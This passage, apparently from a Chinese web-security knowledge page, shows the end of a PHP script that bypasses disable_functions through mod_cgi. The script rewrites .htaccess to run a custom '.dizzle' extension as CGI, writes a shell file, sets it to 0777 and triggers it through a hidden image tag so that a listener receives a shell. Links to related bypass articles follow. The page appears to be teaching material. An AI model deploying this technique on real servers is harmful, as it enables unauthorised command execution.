    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: '</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?checked=true'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//execute the script again to see if the htaccess test worked</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token variable">$modcgi</span> <span class="token operator">=</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'mod_cgi'</span><span class="token punctuation">,</span> <span class="token function">apache_get_modules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// mod_cgi enabled?</span>
    <span class="token variable">$writable</span> <span class="token operator">=</span> <span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//current dir writable?</span>
    <span class="token variable">$htaccess</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTACCESS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//htaccess enabled?</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Mod-Cgi enabled&quot;</span><span class="token punctuation">,</span><span class="token variable">$modcgi</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Yes&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;No&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Is writable&quot;</span><span class="token punctuation">,</span><span class="token variable">$writable</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Yes&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;No&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;htaccess working&quot;</span><span class="token punctuation">,</span><span class="token variable">$htaccess</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Yes&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;No&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$modcgi</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$writable</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$htaccess</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;Error. All of the above must be true for the script to work!&quot;</span><span class="token punctuation">;</span> <span class="token comment">//abort if not</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Backing up .htaccess&quot;</span><span class="token punctuation">,</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;.htaccess&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;.htaccess.bak&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Suceeded! Saved in .htaccess.bak&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Failed!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//make a backup, cause you never know.</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Write .htaccess file&quot;</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.htaccess'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Options +ExecCGI\nAddHandler cgi-script .dizzle&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Succeeded!&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Failed!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//.dizzle is a nice extension</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Write shell file&quot;</span><span class="token punctuation">,</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.dizzle'</span><span class="token punctuation">,</span><span class="token variable">$shellfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Succeeded!&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Failed!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//write the file</span>
        <span class="token function">checkEnabled</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;Chmod 777&quot;</span><span class="token punctuation">,</span><span class="token function">chmod</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;shell.dizzle&quot;</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Succeeded!&quot;</span><span class="token punctuation">,</span><span class="token double-quoted-string string">&quot;Failed!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//rwx</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;&quot;</span><span class="token punctuation">;</span> <span class="token comment">//call the script</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><h3 id="通过antsword看绕过disable-functions"><a href="https://www.anquanke.com/post/id/195686#h3-3" target="_blank" rel="noopener noreferrer">通过Antsword看绕过disable_functions<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="#通过antsword看绕过disable-functions" class="header-anchor">#</a></h3> <h1 id="php安全练习网站">PHP安全练习网站 <a href="#php安全练习网站" class="header-anchor">#</a></h1> <p>https://www.ripstech.com/php-security-calendar-2017/</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">12/14/2020, 2:03:22 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev"><a href="/knowledge/web/logical-vulns.html" class="prev"><i aria-label="icon: left" class="anticon anticon-left"><svg viewBox="64 64 896 896" focusable="false" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></svg></i>
        逻辑漏洞挖掘
      </a></span> <span class="next"><a href="/knowledge/web/same-origin-policy.html">
        同源策略和域安全
        <i aria-label="icon: right" class="anticon anticon-right"><svg viewBox="64 64 896 896" focusable="false" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path></svg></i></a></span></p></div> </main> <!----></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.ce545bc8.js" defer></script><script src="/assets/js/2.c70695c7.js" defer></script><script src="/assets/js/99.78c0c4bc.js" defer></script>
  </body>
</html>